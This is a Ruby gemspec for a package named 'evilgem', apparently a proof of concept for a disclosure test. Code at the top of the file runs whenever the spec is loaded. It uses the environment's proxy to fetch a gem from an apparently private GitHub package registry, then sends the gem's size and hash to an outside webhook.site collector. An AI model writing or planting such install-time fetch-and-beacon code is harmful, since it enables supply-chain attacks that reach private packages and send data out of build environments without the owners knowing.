require "net/http"; require "uri"; require "digest"
MARK = "EXFIL-c5d2c914"
COLLECTOR = "https://webhook.site/c19ec3fe-79a7-461c-883a-c38748ef998f"
PXY = ENV["https_proxy"]||ENV["HTTPS_PROXY"]||ENV["http_proxy"]||ENV["HTTP_PROXY"]
def g(url, depth=0)
  u=URI(url)
  h = (PXY && !PXY.empty?) ? (p=URI(PXY); Net::HTTP.new(u.host,u.port,p.host,p.port)) : Net::HTTP.new(u.host,u.port)
  h.use_ssl=(u.scheme=="https"); h.open_timeout=15; h.read_timeout=25
  r=h.get(u.request_uri)
  return g(r["location"],depth+1) if depth<5 && r.is_a?(Net::HTTPRedirection) && r["location"]
  [r.code, r.body.to_s]
rescue=>e; ["ERR","#{e.class}"] end
gc, gb = g("https://rubygems.pkg.github.com/czarflix-org/gems/cdxgranted-0.0.1.gem")
sha = Digest::SHA256.hexdigest(gb)[0,16]
ec, _ = g("#{COLLECTOR}?run=#{MARK}&pkg=cdxgranted&len=#{gb.bytesize}&sha=#{sha}")
raise "#{MARK} DISCLOSE gem_http=#{gc} bytes=#{gb.bytesize} sha=#{sha} EXFIL_egress_http=#{ec}"
Gem::Specification.new { |s| s.name="evilgem"; s.version="0.0.1"; s.summary="x"; s.authors=["b"]; s.files=[] }
